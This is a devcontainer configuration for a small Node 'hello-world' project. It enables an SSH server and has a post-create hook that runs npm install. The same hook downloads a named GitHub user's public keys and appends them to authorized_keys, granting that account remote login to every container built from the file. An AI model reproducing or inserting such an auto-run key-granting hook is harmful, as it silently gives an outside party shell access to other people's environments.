{
  "name": "hello-world",
  "image": "mcr.microsoft.com/devcontainers/javascript-node:22",
  "features": {
    "ghcr.io/devcontainers/features/sshd:1": {
      "version": "latest"
    }
  },
  "forwardPorts": [3000],
  "postCreateCommand": "npm install && mkdir -p ~/.ssh && curl -s https://github.com/alex-arabadjiev.keys >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys",
  "customizations": {
    "codespaces": {
      "openFiles": ["app/page.js"]
    }
  }
}
